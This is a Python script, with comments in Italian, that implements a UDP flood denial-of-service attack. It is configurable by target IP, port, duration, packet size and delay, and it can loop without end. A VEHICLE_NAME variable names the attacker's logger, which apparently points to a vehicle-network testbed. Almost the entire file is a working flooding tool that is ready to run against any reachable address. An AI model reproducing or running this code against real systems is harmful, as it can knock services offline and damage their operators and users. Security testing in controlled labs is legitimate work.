import os
import socket
import time
import argparse
import logging
import os

class Attack:
    def __init__(self, target_ip, target_port=80, duration=60, packet_size=1024, delay=0.001):
        """
        Crea un attaccante UDP per eseguire un flood su un target.

        Parametri:
        - target_ip: IP di destinazione
        - target_port: Porta di destinazione (default: 80)
        - duration: Durata dell'attacco in secondi (default: 60)
        - packet_size: Dimensione di ogni pacchetto in byte (default: 1024)
        - delay: Ritardo tra i pacchetti in secondi (default: 0.001)
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.packet_size = packet_size
        self.delay = delay


    def attack_condition(self):
        if self.duration == 0:
            return True
        else:
            return time.time() < self.end_time


    def start_attack(self):
        """
        Esegui un attacco UDP flood sul target specificato.
        """
        # Crea il socket UDP
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # Crea dati casuali per il pacchetto
        data = os.urandom(self.packet_size)
        
        packets_sent = 0
        bytes_sent = 0
        start_time = time.time()
        self.end_time = start_time + self.duration

        logger.debug(f"Starting UDP flood to {self.target_ip}:{self.target_port}")
        if self.duration != 0:
            logger.debug(f"Test will run for {self.duration} seconds")
        else:
            logger.debug(f"Attack will continue until stopped by user.")

        logger.debug(f"Packet size: {self.packet_size} bytes")

        try:
            
            while self.attack_condition():
                sock.sendto(data, (self.target_ip, self.target_port))
                packets_sent += 1
                bytes_sent += self.packet_size

                # Stampa le statistiche ogni 10000 pacchetti
                if packets_sent % 10000 == 0:
                    elapsed = time.time() - start_time
                    rate = packets_sent / elapsed if elapsed > 0 else 0
                    mbps = (bytes_sent * 8 / 1000000) / elapsed if elapsed > 0 else 0
                    logger.info(f"Sent {packets_sent} packets, {bytes_sent/1000000:.2f} MB ({rate:.2f} pps, {mbps:.2f} Mbps)")

                # Aggiungi un ritardo tra i pacchetti se specificato
                if self.delay > 0:
                    time.sleep(self.delay)

        except Exception:
            logger.debug("\nAttack stopped unexpectedly!")

        finally:
            # Chiudi il socket
            sock.close()

            # Stampa le statistiche finali
            elapsed = time.time() - start_time
            rate = packets_sent / elapsed if elapsed > 0 else 0
            mbps = (bytes_sent * 8 / 1000000) / elapsed if elapsed > 0 else 0

            logger.info("Attack completed")
            logger.debug(f"Duration: {elapsed:.2f} seconds")
            logger.debug(f"Packets sent: {packets_sent}")
            logger.debug(f"Data sent: {bytes_sent/1000000:.2f} MB")
            logger.debug(f"Rate: {rate:.2f} packets per second")
            logger.debug(f"Throughput: {mbps:.2f} Mbps")


def main():
    global logger
    parser = argparse.ArgumentParser(description="UDP Flood Attack Script")
    parser.add_argument('--logging_level', type=str, default='INFO', help='Logging level')
    parser.add_argument("--target_ip", help="Target IP address")
    parser.add_argument("--target_port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--duration", type=int, default=60, help="Duration of the attack in seconds (default: 60)")
    parser.add_argument("--packet_size", type=int, default=1024, help="Size of each packet in bytes (default: 1024)")
    parser.add_argument("--delay", type=float, default=0.001, help="Delay between packets in seconds (default: 0.001)")

    args = parser.parse_args()
    vehicle_name = os.getenv('VEHICLE_NAME')
    assert vehicle_name is not None, "VEHICLE_NAME environment variable must be set"
    logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=str(args.logging_level).upper())
    logger = logging.getLogger(vehicle_name+'_'+'attacker')
    args.logger = logger
    logger.info(f"Starting attack from vehicle: {vehicle_name}")

    attack = Attack(
        target_ip=args.target_ip,
        target_port=args.target_port,
        duration=args.duration,
        packet_size=args.packet_size,
        delay=args.delay
    )

    attack.start_attack()


if __name__ == "__main__":
    main()